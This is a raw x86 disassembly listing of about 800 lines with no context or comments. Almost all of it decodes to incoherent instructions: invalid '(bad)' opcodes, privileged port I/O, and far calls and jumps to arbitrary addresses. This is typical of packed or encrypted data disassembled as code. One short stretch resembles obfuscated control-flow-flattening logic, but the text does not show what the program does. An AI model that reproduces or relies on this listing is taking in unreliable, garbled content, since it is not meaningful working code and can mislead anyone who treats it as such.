  40c6f2:	push   ebx
  40c6f3:	add    edi,edi
  40c6f5:	add    al,0x57
  40c6f7:	xchg   esi,eax
  40c6f8:	sub    BYTE PTR [ebx+0x1590bed9],bl
  40c6fe:	xchg   ch,bl
  40c700:	aaa    
  40c701:	xchg   esi,eax
  40c702:	test   al,0x64
  40c704:	push   0xffffffd6
  40c706:	in     al,0x2f
  40c708:	dec    ebp
  40c709:	fadd   QWORD PTR [ebx]
  40c70b:	pop    ss
  40c70c:	sbb    DWORD PTR [ebx+0x3b79c924],ecx
  40c712:	add    edx,DWORD PTR [esp]
  40c715:	scas   al,BYTE PTR es:[edi]
  40c716:	push   ebx
  40c717:	leave  
  40c718:	mov    cl,0xe0
  40c71a:	xor    ecx,DWORD PTR [edx+0xe82c7da]
  40c720:	or     al,0xd1
  40c722:	test   DWORD PTR [eax],0x389dc848
  40c728:	scas   eax,DWORD PTR es:[edi]
  40c729:	mov    WORD PTR [esi],ss
  40c72b:	sub    bl,BYTE PTR [ecx-0x50]
  40c72e:	call   0x7c5b:0xed06c23b
  40c735:	jg     0x40c792
  40c737:	call   0x96efdc5b
  40c73c:	fimul  DWORD PTR [ebx+0x5]
  40c73f:	fdivr  QWORD PTR [edx+0x7dafdfa]
  40c745:	mov    cl,0x6f
  40c747:	stos   DWORD PTR es:[edi],eax
  40c748:	jo     0x40c7ad
  40c74a:	mov    ch,cl
  40c74c:	jns    0x40c701
  40c74e:	jl     0x40c70d
  40c750:	clc    
  40c751:	js     0x40c6df
  40c753:	xchg   esp,eax
  40c754:	mov    ebp,0x40f19156
  40c759:	ret    
  40c75a:	inc    eax
  40c75b:	jecxz  0x40c7d3
  40c75d:	dec    eax
  40c75e:	addr16 jmp 0x30f16968
  40c764:	cmp    al,0xe1
  40c766:	lock inc eax
  40c768:	pop    esp
  40c769:	jmp    0x1cb533a7
  40c76e:	loop   0x40c7dc
  40c770:	call   0x5e804345
  40c775:	mov    al,ds:0xea4e68b8
  40c77a:	call   0x75:0xe4759cc0
  40c781:	jp     0x40c75f
  40c783:	repz push es
  40c785:	out    dx,eax
  40c786:	or     DWORD PTR [ecx+edi*2-0x18da731f],0x18
  40c78e:	and    eax,0xee9d431b
  40c793:	aad    0xef
  40c795:	mov    esp,0x6d16477
  40c79a:	jmp    0x3073:0xb6e5
  40c7a0:	xor    eax,0x85d6ef7b
  40c7a5:	cmp    BYTE PTR [edx+ecx*4-0x7],0x71
  40c7aa:	jb     0x40c7e8
  40c7ac:	(bad)  
  40c7ad:	js     0x40c74e
  40c7af:	adc    dh,BYTE PTR [esi+0x6f]
  40c7b2:	mov    eax,ds:0x115fb3dc
  40c7b7:	mov    eax,ds:0xf46053f7
  40c7bc:	jp     0x40c75c
  40c7be:	or     ah,bh
  40c7c0:	mov    ebx,0x5d12d28d
  40c7c5:	(bad)  
  40c7c6:	cmc    
  40c7c7:	xor    al,al
  40c7c9:	adc    eax,0x7f8f5cf8
  40c7ce:	stc    
  40c7cf:	es add eax,0xe5de9498
  40c7d5:	arpl   bx,ax
  40c7d7:	lock retf 0x9398
  40c7db:	mov    dh,0xe0
  40c7dd:	xchg   edi,ecx
  40c7df:	sbb    edx,DWORD PTR [edx]
  40c7e1:	adc    ecx,DWORD PTR [ecx]
  40c7e3:	xlat   BYTE PTR ds:[ebx]
  40c7e4:	fldcw  WORD PTR [ebx]
  40c7e6:	scas   al,BYTE PTR es:[edi]
  40c7e7:	call   0x8f4a:0x7584108a
  40c7ee:	jns    0x40c789
  40c7f0:	push   0x818f9f5d
  40c7f5:	sub    al,0xb8
  40c7f7:	sbb    DWORD PTR [edi+0x747fd833],0x148dcffe
  40c801:	lds    ecx,FWORD PTR [edi+0x4f0c4bee]
  40c807:	mov    ds:0x12ddc349,eax
  40c80c:	(bad)  
  40c80d:	imul   ebp,ebx,0xffffffd5
  40c810:	mov    ebx,0xb8638547
  40c815:	and    BYTE PTR [eax+0x11],bh
  40c818:	in     al,dx
  40c819:	in     eax,0x51
  40c81b:	add    eax,0xb6341366
  40c820:	or     BYTE PTR [edi+0x49],al
  40c823:	outs   dx,DWORD PTR ds:[esi]
  40c824:	fcomp  DWORD PTR [ecx-0x6b89c7ee]
  40c82a:	xor    edx,DWORD PTR [eax+0xe010214]
  40c830:	dec    ecx
  40c831:	popf   
  40c832:	push   ecx
  40c833:	xchg   BYTE PTR [ecx+edi*8-0x10],cl
  40c837:	aas    
  40c838:	xchg   ebp,eax
  40c839:	ds add ebx,esp
  40c83c:	or     eax,0x892fca72
  40c841:	mov    eax,ds:0x60683ba7
  40c846:	fmul   DWORD PTR [edx+edx*2]
  40c849:	test   al,0x58
  40c84b:	sub    eax,ebp
  40c84d:	xor    ah,al
  40c84f:	mov    ds:0x4a7fa730,eax
  40c854:	scas   al,BYTE PTR es:[edi]
  40c855:	inc    esp
  40c856:	adc    al,0xc7
  40c858:	sub    BYTE PTR [ebx],ch
  40c85a:	and    eax,0xf02fad2c
  40c85f:	xor    BYTE PTR [edx+0x32],0x91
  40c863:	inc    esp
  40c864:	retf   0x55e9
  40c867:	mov    cl,0x6f
  40c869:	adc    cl,BYTE PTR [ebp+0x1f]
  40c86c:	daa    
  40c86d:	popf   
  40c86e:	in     al,dx
  40c86f:	pop    ss
  40c870:	pop    ebx
  40c871:	mov    dl,0x74
  40c873:	es (bad) 
  40c876:	retf   
  40c877:	aad    0x5f
  40c879:	sbb    DWORD PTR [ebx],ebx
  40c87b:	cli    
  40c87c:	not    DWORD PTR [edx-0x2f]
  40c87f:	retf   0x8e95
  40c882:	mov    al,0x8c
  40c884:	sbb    DWORD PTR [ecx-0x5],eax
  40c887:	test   DWORD PTR [ebp+0x4c],0x3cce6379
  40c88e:	sub    eax,0x84c545db
  40c893:	ror    BYTE PTR [edx+esi*2+0x22daf4ab],1
  40c89a:	dec    ecx
  40c89b:	pusha  
  40c89c:	push   es
  40c89d:	fist   DWORD PTR [eax]
  40c89f:	pop    ss
  40c8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a1:	icebp  
  40c8a2:	pop    eax
  40c8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8a4:	push   es
  40c8a5:	daa    
  40c8a6:	hlt    
  40c8a7:	push   edi
  40c8a8:	adc    DWORD PTR ds:0x482d54c2,ecx
  40c8ae:	mov    ch,0xd
  40c8b0:	outs   dx,BYTE PTR ds:[esi]
  40c8b1:	sub    eax,0x9def4bfb
  40c8b6:	jg     0x40c86b
  40c8b8:	push   0x45b2585f
  40c8bd:	mov    al,ds:0x8c8973d3
  40c8c2:	outs   dx,DWORD PTR ds:[esi]
  40c8c3:	xor    bh,BYTE PTR [edi+eiz*2]
  40c8c6:	jp     0x40c913
  40c8c8:	out    0x1b,al
  40c8ca:	push   ecx
  40c8cb:	cmp    DWORD PTR [ebx-0x25],0x1ececa66
  40c8d2:	daa    
  40c8d3:	mov    ebx,0x3d213ca5
  40c8d8:	or     eax,DWORD PTR [ebx+edx*1+0x52]
  40c8dc:	jnp    0x40c8db
  40c8de:	and    bh,BYTE PTR [esi]
  40c8e0:	xchg   BYTE PTR [ebp+ebx*4+0x2a],dl
  40c8e4:	dec    eax
  40c8e5:	ror    DWORD PTR [esi-0x2414ebd8],cl
  40c8eb:	mov    eax,ds:0x90c5038
  40c8f0:	lds    ebp,FWORD PTR [ecx]
  40c8f2:	sar    DWORD PTR [esi-0x68ab7312],0x83
  40c8f9:	rol    BYTE PTR [eax+0x28],1
  40c8fc:	fcom   QWORD PTR [esi]
  40c8fe:	dec    esp
  40c8ff:	call   0x9e9a:0x4043b9f
  40c906:	xchg   esi,eax
  40c907:	xor    dh,BYTE PTR [esi+ebp*8-0x34]
  40c90b:	aam    0x4e
  40c90d:	test   eax,0x9545efe1
  40c912:	stc    
  40c913:	and    eax,0xb9a9ff57
  40c918:	xchg   DWORD PTR [ebx+ecx*4],ecx
  40c91b:	inc    ebp
  40c91c:	loopne 0x40c8a9
  40c91e:	push   ebp
  40c91f:	clc    
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x564c5e53
  40c96a:	fisttp QWORD PTR [edi+eax*8+0x32]
  40c96e:	popf   
  40c96f:	js     0x40c9e9
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	dec    ebx
  40c976:	std    
  40c977:	repnz in eax,0xd3
  40c97a:	inc    eax
  40c97b:	icebp  
  40c97c:	add    eax,0xfaf5e947
  40c981:	xchg   ebx,eax
  40c982:	int3   
  40c983:	dec    edi
  40c984:	push   ebx
  40c985:	cmp    dh,bh
  40c987:	ins    BYTE PTR es:[edi],dx
  40c988:	(bad)  
  40c989:	push   ebx
  40c98a:	fcomip st,st(3)
  40c98c:	mov    edx,0xbe267d81
  40c991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c992:	adc    ah,BYTE PTR [ecx+0x7a]
  40c995:	repnz in eax,0xa7
  40c998:	lea    eax,[esi+ebp*1-0x7223e2a9]
  40c99f:	mov    cl,0x20
  40c9a1:	(bad)  
  40c9a2:	mov    ecx,0x3c011b2f
  40c9a7:	push   0xffffff9f
  40c9a9:	sub    DWORD PTR [edi+0xcf8e0af],ebx
  40c9af:	outs   dx,DWORD PTR ds:[esi]
  40c9b0:	imul   eax,eax,0x7b
  40c9b3:	fimul  WORD PTR [ebp-0x3]
  40c9b6:	jne    0x40c9ef
  40c9b8:	clc    
  40c9b9:	pop    ds
  40c9ba:	pop    ss
  40c9bb:	pop    esp
  40c9bc:	mov    dh,0xc3
  40c9be:	ins    BYTE PTR es:[edi],dx
  40c9bf:	imul   ebp,DWORD PTR [ecx],0xc70830ec
  40c9c5:	or     DWORD PTR [edi],edx
  40c9c7:	(bad)  
  40c9c9:	jo     0x40c9a3
  40c9cb:	jmp    0x65fa6c04
  40c9d0:	(bad)  
  40c9d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9d2:	jmp    0x2fcd9fb
  40c9d7:	mov    cl,0xa2
  40c9d9:	xchg   DWORD PTR es:[ebx-0x7e],esi
  40c9dd:	push   esp
  40c9de:	mov    esp,DWORD PTR [eax+0x9]
  40c9e1:	jno    0x40c9a4
  40c9e3:	rcl    DWORD PTR [esi+0x3572c85f],0x97
  40c9ea:	sbb    al,0xd9
  40c9ec:	xor    BYTE PTR [esi-0x5],al
  40c9ef:	mov    ecx,edx
  40c9f1:	and    eax,0xfc3924d5
  40c9f6:	imul   ebp,DWORD PTR [eax],0xf16edd1b
  40c9fc:	ds shr ebp,1
  40c9ff:	addr16 xchg esp,eax
  40ca01:	lock mov ch,0xa0
  40ca04:	scas   al,BYTE PTR es:[edi]
  40ca05:	jnp    0x40c9f8
  40ca07:	test   al,0xf
  40ca09:	ins    BYTE PTR es:[edi],dx
  40ca0a:	pusha  
  40ca0b:	test   DWORD PTR [edi-0x50f3d9b0],esp
  40ca11:	sbb    ebx,esi
  40ca13:	addr16 aad 0x8d
  40ca16:	loop   0x40ca2c
  40ca18:	call   0xc755:0x7e3bb5e0
  40ca1f:	or     bl,ch
  40ca21:	jnp    0x40ca40
  40ca23:	add    edx,esi
  40ca25:	loop   0x40ca4c
  40ca27:	xor    esi,edx
  40ca29:	dec    DWORD PTR [eax-0x35]
  40ca2c:	inc    esi
  40ca2d:	arpl   WORD PTR [esi],cx
  40ca2f:	adc    al,0x3
  40ca31:	cwde   
  40ca32:	call   0x9cc92ceb
  40ca37:	sub    ah,cl
  40ca39:	push   0x5b
  40ca3b:	retf   0xa180
  40ca3e:	fs xor al,ah
  40ca41:	icebp  
  40ca42:	inc    esp
  40ca43:	daa    
  40ca44:	jmp    0x40ca2b
  40ca46:	push   esi
  40ca47:	sbb    BYTE PTR [ecx-0x56a2852b],bh
  40ca4d:	inc    esp
  40ca4e:	inc    ebp
  40ca4f:	test   al,0x64
  40ca51:	jg     0x40ca4d
  40ca53:	mov    bl,0xc5
  40ca55:	fcmovb st,st(0)
  40ca57:	lea    esi,[esi-0x5b5def0e]
  40ca5d:	or     edx,edx
  40ca5f:	sbb    ecx,ebx
  40ca61:	loop   0x40ca53
  40ca63:	mov    al,dl
  40ca65:	adc    BYTE PTR [ecx],bl
  40ca67:	push   edx
  40ca68:	push   0x4
  40ca6a:	sbb    esp,eax
  40ca6c:	mov    ebp,0x48924a30
  40ca71:	fwait
  40ca72:	mov    ebp,0xc648ec2b
  40ca77:	jp     0x40ca01
  40ca79:	mov    esp,0x6e39133
  40ca7e:	push   cs
  40ca7f:	and    BYTE PTR [ebp-0x432635d9],bh
  40ca85:	sub    BYTE PTR [bp+0x1671],0x54
  40ca8b:	mov    WORD PTR [ebp-0x6c],cs
  40ca8e:	daa    
  40ca8f:	(bad)  
  40ca90:	pop    ecx
  40ca91:	outs   dx,DWORD PTR ds:[esi]
  40ca92:	lock cmp eax,0xb4aa79e6
  40ca98:	xchg   esi,eax
  40ca99:	fst    QWORD PTR [eax+edx*4-0x6]
  40ca9d:	std    
  40ca9e:	in     al,dx
  40ca9f:	add    ch,BYTE PTR [eax-0x16]
  40caa2:	and    dl,ch
  40caa4:	cmp    cl,al
  40caa6:	dec    ebp
  40caa7:	scas   eax,DWORD PTR es:[edi]
  40caa8:	mov    dl,0x9a
  40caaa:	pop    es
  40caab:	outs   dx,BYTE PTR ds:[esi]
  40caac:	ja     0x40ca3b
  40caae:	retf   0x3bce
  40cab1:	arpl   WORD PTR [ebp-0x5d],bx
  40cab4:	ja     0x40ca5e
  40cab6:	sub    DWORD PTR [eax+0x1],0x1a
  40caba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cabb:	div    DWORD PTR [ebp+0x1]
  40cabe:	rol    BYTE PTR [ecx],cl
  40cac0:	jae    0x40ca93
  40cac2:	shr    ch,cl
  40cac4:	pop    edx
  40cac5:	mov    ah,0xf8
  40cac7:	push   ebp
  40cac8:	(bad)  
  40cac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caca:	rcl    BYTE PTR [ebp+0x576fc5c2],cl
  40cad0:	mov    ch,0x11
  40cad2:	xor    cl,0x23
  40cad5:	adc    al,BYTE PTR [esp+edx*1+0x1a25775d]
  40cadc:	loope  0x40ca61
  40cade:	sti    
  40cadf:	cmp    DWORD PTR ds:0x1c43c83b,ebp
  40cae5:	jl     0x40ca88
  40cae7:	pushf  
  40cae8:	lods   eax,DWORD PTR ds:[esi]
  40cae9:	loop   0x40cab7
  40caeb:	mov    al,0xfa
  40caed:	fiadd  WORD PTR [edi]
  40caef:	out    dx,eax
  40caf0:	inc    esi
  40caf1:	push   ebp
  40caf2:	jg     0x40ca9f
  40caf4:	int3   
  40caf5:	loope  0x40ca9c
  40caf7:	leave  
  40caf8:	dec    edx
  40caf9:	lahf   
  40cafa:	(bad)  
  40cafc:	cmc    
  40cafd:	or     ebx,DWORD PTR [esi-0x71]
  40cb00:	jns    0x40cabc
  40cb02:	and    al,0xb8
  40cb04:	fidiv  WORD PTR [bx+si+0x7f]
  40cb08:	mov    edi,0x220fd137
  40cb0d:	imul   ecx,DWORD PTR [edx-0x72],0xfffffff0
  40cb11:	push   es
  40cb12:	mov    bh,0xbc
  40cb14:	fistp  DWORD PTR [ecx+esi*4+0x41]
  40cb18:	inc    esi
  40cb19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb1a:	jns    0x40cb3c
  40cb1c:	sub    DWORD PTR [ebx],ebp
  40cb1e:	push   ebp
  40cb1f:	push   ss
  40cb20:	mov    esp,cr2
  40cb23:	call   DWORD PTR [ebx]
  40cb25:	and    al,dl
  40cb27:	hlt    
  40cb28:	addr16 mov ch,0x19
  40cb2b:	cmp    al,0xa6
  40cb2d:	adc    eax,edx
  40cb2f:	mov    ebp,0xfd2615d1
  40cb34:	(bad)  
  40cb35:	add    DWORD PTR gs:[esi-0x77],0xffffffec
  40cb3a:	fs jmp 0x3ad7c165
  40cb40:	and    ebx,DWORD PTR [ecx-0x1f]
  40cb43:	mov    ah,0xd6
  40cb45:	jle    0x40cb04
  40cb47:	lea    ebx,[ebp-0x91164a4]
  40cb4d:	jmp    0x40cbb0
  40cb4f:	nop
  40cb50:	popf   
  40cb51:	iret   
  40cb52:	js     0x40cb19
  40cb54:	repz adc dh,cl
  40cb57:	mov    ebx,DWORD PTR [edx-0x5f]
  40cb5a:	add    al,0x9d
  40cb5c:	dec    ecx
  40cb5e:	add    edi,edi
  40cb60:	add    eax,0x321675fb
  40cb65:	jbe    0x40cba3
  40cb67:	(bad)  
  40cb68:	(bad)  
  40cb69:	vminss xmm1,xmm1,DWORD PTR [edx]
  40cb6d:	dec    ecx
  40cb6e:	sub    bl,ch
  40cb70:	xchg   edx,eax
  40cb71:	js     0x40cb2f
  40cb73:	adc    bh,BYTE PTR [ebp-0x75ca953f]
  40cb79:	add    DWORD PTR [edi-0x8],esp
  40cb7c:	mov    cl,0xcc
  40cb7e:	or     BYTE PTR [eax+ecx*1+0x29e64773],bh
  40cb85:	ja     0x40cb1b
  40cb87:	fbstp  TBYTE PTR [ebx-0x7c76aa8e]
  40cb8d:	lock imul ebx,DWORD PTR [ecx+0x75],0x72
  40cb92:	mov    DWORD PTR [esi+0x2f0a4329],edi
  40cb98:	push   0xfffffffe
  40cb9a:	iret   
  40cb9b:	jnp    0x40cb8c
  40cb9d:	hlt    
  40cb9e:	inc    ecx
  40cb9f:	sbb    edx,eax
  40cba1:	loop   0x40cb3a
  40cba3:	dec    ecx
  40cba4:	and    edi,DWORD PTR [edi+0x26c8fd69]
  40cbaa:	mov    BYTE PTR [edx],al
  40cbac:	jne    0x40cb68
  40cbae:	cmc    
  40cbaf:	loopne 0x40cbbb
  40cbb1:	xor    BYTE PTR [ecx],0xca
  40cbb4:	rcr    BYTE PTR [eax],0x88
  40cbb7:	add    BYTE PTR [eax+edx*1+0x68],dl
  40cbbb:	pop    ecx
  40cbbc:	mov    bl,0x49
  40cbbe:	fisttp DWORD PTR [eax]
  40cbc0:	adc    BYTE PTR [esi+0x4a],bl
  40cbc3:	shl    BYTE PTR [esi],1
  40cbc5:	add    DWORD PTR [ecx-0x76],0x1cceb6c5
  40cbcc:	sub    al,BYTE PTR cs:[ebp+eax*8-0x78e429f2]
  40cbd4:	(bad)  
  40cbd6:	mov    ah,0x46
  40cbd8:	out    dx,al
  40cbd9:	inc    esp
  40cbda:	data16 loop 0x40cc07
  40cbdd:	push   esp
  40cbde:	jo     0x40cc1c
  40cbe0:	inc    edx
  40cbe1:	in     eax,0xab
  40cbe3:	shr    DWORD PTR [ebx-0x8],0x77
  40cbe7:	repnz (bad) 
  40cbe9:	mov    eax,0x40da1b5f
  40cbee:	push   DWORD PTR [eax+0x7d]
  40cbf1:	xor    eax,0xc4305320
  40cbf6:	clc    
  40cbf7:	loope  0x40cc6b
  40cbf9:	in     al,0x35
  40cbfb:	test   BYTE PTR [esi-0x4d],al
  40cbfe:	inc    edx
  40cbff:	cs mov ebp,0xaa97919f
  40cc05:	add    BYTE PTR [ebx],ch
  40cc07:	push   ebp
  40cc08:	sub    BYTE PTR [esi+0x2e],0x76
  40cc0c:	cmp    ecx,DWORD PTR [esi-0xfe31dff]
  40cc12:	imul   ebx,ebp,0xffffffab
  40cc15:	ja     0x40cc2f
  40cc17:	or     BYTE PTR [eax],cl
  40cc19:	push   ds
  40cc1a:	dec    esp
  40cc1b:	fbld   TBYTE PTR [edi]
  40cc1d:	das    
  40cc1e:	xor    eax,0x5220300c
  40cc23:	xchg   ecx,eax
  40cc24:	(bad)  
  40cc25:	jo     0x40cc15
  40cc27:	rol    esi,cl
  40cc29:	cwde   
  40cc2a:	pop    ecx
  40cc2b:	ror    BYTE PTR [edi],0xaf
  40cc2e:	inc    edi
  40cc2f:	(bad)  ds:0xb7bfb3f8
  40cc35:	xchg   esp,eax
  40cc36:	xlat   BYTE PTR ds:[ebx]
  40cc37:	cld    
  40cc38:	cwde   
  40cc39:	sub    DWORD PTR [esp+esi*1],edi
  40cc3c:	inc    edx
  40cc3d:	dec    ebp
  40cc3e:	data16 sbb al,0xe2
  40cc41:	push   ecx
  40cc42:	dec    ecx
  40cc43:	mov    bl,BYTE PTR [ebp-0x35]
  40cc46:	dec    esi
  40cc47:	(bad)  
  40cc48:	sub    eax,esp
  40cc4a:	(bad)  
  40cc4c:	jle    0x40cc21
  40cc4e:	sbb    BYTE PTR [ecx],ah
  40cc50:	fidiv  DWORD PTR [ebp-0x55728e64]
  40cc56:	in     eax,0x47
  40cc58:	lods   eax,DWORD PTR ds:[esi]
  40cc59:	cmp    BYTE PTR [eax-0x36],al
  40cc5c:	aas    
  40cc5d:	cmp    al,0xb2
  40cc5f:	lock popf 
  40cc61:	int    0x27
  40cc63:	push   0x27
  40cc65:	cli    
  40cc66:	pop    ebx
  40cc67:	mov    eax,0xa5e0f71d
  40cc6c:	sbb    al,bl
  40cc6e:	adc    bl,dl
  40cc70:	add    bh,BYTE PTR [ecx]
  40cc72:	cmp    cl,ch
  40cc74:	adc    al,0x3
  40cc76:	add    BYTE PTR [eax],al
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x6a
  40cc85:	dec    esi
  40cc86:	mov    ds:0x78a22ea6,al
  40cc8b:	js     0x40cd01
  40cc8d:	jle    0x40cd07
  40cc8f:	js     0x40cc9e
  40cc91:	xchg   esp,eax
  40cc92:	mov    DWORD PTR [edi+0x6f796302],0x2be81937
  40cc9c:	inc    eax
  40cc9d:	pmulhw mm5,QWORD PTR [eax]
  40cca0:	xor    eax,0x183b4b44
  40cca5:	and    ah,bh
  40cca7:	xor    al,0x69
  40cca9:	inc    esp
  40ccaa:	jb     0x40ccd0
  40ccac:	add    al,cl
  40ccae:	test   al,0x26
  40ccb0:	dec    ebp
  40ccb1:	test   al,0x32
  40ccb3:	fwait
  40ccb4:	out    dx,eax
  40ccb5:	mov    al,cl
  40ccb7:	lods   eax,DWORD PTR ds:[esi]
  40ccb8:	call   DWORD PTR [ebx+0x4d]
  40ccbb:	test   al,0x62
  40ccbd:	or     al,0xf7
  40ccbf:	sub    dh,bl
  40ccc1:	add    eax,0xc111a414
  40ccc6:	idiv   ebp
  40ccc8:	addr16 mov al,0x29
  40cccb:	sub    al,0xcc
  40cccd:	loop   0x40cc9d
  40cccf:	mov    BYTE PTR [eax-0x20b1363d],bh
  40ccd5:	test   BYTE PTR [edx-0x465c3c6e],0xa4
  40ccdc:	iret   
  40ccdd:	ffreep st(6)
  40ccdf:	adc    BYTE PTR [ebp+0x6e],bl
  40cce2:	mov    bh,0xba
  40cce4:	enter  0x7437,0x44
  40cce8:	(bad)
  40cceb:	cwde   
  40ccec:	or     edx,esi
  40ccee:	sub    al,0x10
  40ccf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccf1:	xchg   ebx,eax
  40ccf2:	push   edx
  40ccf3:	xchg   edi,eax
  40ccf4:	lds    esi,FWORD PTR [esi+0x78]
  40ccf7:	in     eax,0xd9
  40ccf9:	xor    BYTE PTR [edx+eax*1+0x16],ah
  40ccfd:	(bad)  
  40ccfe:	mov    edi,0x4ea1814d
  40cd03:	inc    ebp
  40cd04:	neg    ch
  40cd06:	in     eax,dx
  40cd07:	xchg   ecx,eax
  40cd08:	inc    ebx
  40cd09:	imul   eax,DWORD PTR [ebx+0x78818290],0xffffffad
  40cd10:	rcl    DWORD PTR [ecx-0x78],cl
  40cd13:	or     BYTE PTR [esi+0x72],dh
  40cd16:	pop    esp
  40cd17:	pop    edi
  40cd18:	add    al,0x5d
  40cd1a:	fs mov ah,0xe2
  40cd1d:	loope  0x40cd9e
  40cd1f:	or     DWORD PTR [ecx+edi*4+0xae5c35d],esp
  40cd26:	out    0x97,al
  40cd28:	(bad)  [esp+esi*2+0x2d38e132]
  40cd2f:	aam    0x85
  40cd31:	add    BYTE PTR ds:0x673a3771,cl
  40cd37:	aaa    
  40cd38:	shl    DWORD PTR [ebx+eiz*1],1
  40cd3b:	call   0x7913:0xaf434e5b
  40cd42:	dec    ecx
  40cd43:	pushf  
  40cd44:	repnz pop esi
  40cd46:	jne    0x40cdc4
  40cd48:	in     eax,dx
  40cd49:	dec    edx
  40cd4a:	inc    ebp
  40cd4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd4c:	into   
  40cd4d:	(bad)  
  40cd4e:	inc    edi
  40cd4f:	xor    BYTE PTR [ebp-0x54],bh
  40cd52:	push   edx
  40cd53:	sbb    eax,DWORD PTR [edi+0x5b37e8c7]
  40cd59:	mov    eax,ds:0xd7d928e3
  40cd5e:	sti    
  40cd5f:	inc    ebx
  40cd60:	data16 mov bl,0xfd
  40cd63:	xor    al,BYTE PTR [edx-0x728dd96]
  40cd69:	add    al,0x8c
  40cd6b:	addr16 cmc 
  40cd6d:	push   edi
  40cd6e:	stos   BYTE PTR es:[edi],al
  40cd6f:	jns    0x40cdec
  40cd71:	pop    esi
  40cd72:	scas   eax,DWORD PTR es:[edi]
  40cd73:	ret    0x9895
  40cd76:	clc    
  40cd77:	add    DWORD PTR [edi],esi
  40cd79:	and    DWORD PTR [edx-0x478db2ae],esp
  40cd7f:	mov    ecx,0xb56b5b04
  40cd84:	pop    ds
  40cd85:	fs das 
  40cd87:	mov    esp,0xb69849c5
  40cd8c:	outs   dx,BYTE PTR ds:[esi]
  40cd8d:	retf   
  40cd8e:	cmp    BYTE PTR [esi],0x9
  40cd91:	imul   eax
  40cd93:	cld    
  40cd94:	adc    ebp,ebx
  40cd96:	jecxz  0x40cdd5
  40cd98:	mov    al,0x15
  40cd9a:	gs jmp 0x448bbc0b
  40cda0:	retf   0x4162
  40cda3:	or     esp,DWORD PTR [esi-0x1d]
  40cda6:	push   eax
  40cda7:	pusha  
  40cda8:	xlat   BYTE PTR ds:[ebx]
  40cda9:	dec    ebp
  40cdaa:	xor    dh,cl
  40cdac:	shr    DWORD PTR [edx-0x5a],cl
  40cdaf:	mov    eax,0x8c1816ea
  40cdb4:	or     eax,0x4e5c3fe7
  40cdb9:	ror    BYTE PTR [eax+0xb],0x96
  40cdbd:	mov    WORD PTR [edi],?
  40cdbf:	or     DWORD PTR [edx+ecx*4+0xa],0xffffffef
  40cdc4:	mov    ah,0x2c
  40cdc6:	sbb    BYTE PTR [ebx+ebx*4-0x124858d6],ah
  40cdcd:	les    esi,FWORD PTR [ecx-0x38007697]
  40cdd3:	push   eax
  40cdd4:	adc    BYTE PTR [esi+0x39e013e4],bl
  40cdda:	mov    DWORD PTR [esi],edx
  40cddc:	aas    
  40cddd:	sub    eax,0xd7e1c985
  40cde2:	dec    ebp
  40cde3:	push   es
  40cde4:	mov    esp,DWORD PTR [edx+ebx*8+0x11]
  40cde8:	pop    ebx
  40cde9:	ja     0x40ce43
  40cdeb:	or     esp,DWORD PTR [edx+0x60ab3690]
  40cdf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdf2:	sahf   
  40cdf3:	or     ch,BYTE PTR [edx]
  40cdf5:	mov    bh,0xf0
  40cdf7:	mov    BYTE PTR ds:0x81d6d485,0xb9
  40cdfe:	inc    edx
  40cdff:	xchg   BYTE PTR [edx+ebp*2],bh
  40ce02:	jp     0x40ce26
  40ce04:	lahf   
  40ce05:	ret    0xc95
  40ce08:	jge    0x40ce10
  40ce0a:	jmp    0x20bb:0xfa49aa43
  40ce11:	adc    al,0x7
  40ce13:	mov    esp,0x48c746
  40ce18:	jg     0x40ce43
  40ce1a:	adc    cl,al
  40ce1c:	pop    ss
  40ce1d:	(bad)  
  40ce1e:	cdq    
  40ce1f:	lea    edx,[eax-0x1ad25dd2]
  40ce25:	ror    edi,cl
  40ce27:	mov    BYTE PTR [ebx+0x5d],ah
  40ce2a:	mul    DWORD PTR [eax]
  40ce2c:	jle    0x40ce8b
  40ce2e:	leave  
  40ce2f:	rcr    DWORD PTR [ebp+0x39],0xb7
  40ce33:	rcr    edx,cl
  40ce35:	jle    0x40ce5b
  40ce37:	das    
  40ce38:	inc    edx
  40ce39:	test   BYTE PTR ss:[ecx],0x17
  40ce3d:	and    BYTE PTR [esi],0xe3
  40ce40:	retf   0x9892
  40ce43:	add    al,0xf1
  40ce46:	sbb    esi,DWORD PTR [edi-0x4bea3361]
  40ce4c:	addr16 mov ds:0xc0b5,eax
  40ce50:	push   edi
  40ce51:	jno    0x40ce05
  40ce53:	mov    dl,0x1e
  40ce55:	or     bl,bh
  40ce57:	std    
  40ce58:	push   ss
  40ce59:	jno    0x40ce05
  40ce5b:	in     al,dx
  40ce5c:	and    DWORD PTR [esi-0xe],eax
  40ce5f:	ins    DWORD PTR es:[edi],dx
  40ce60:	ins    BYTE PTR es:[edi],dx
  40ce61:	sbb    BYTE PTR [eax+eax*1-0x6d2cc7a8],bl
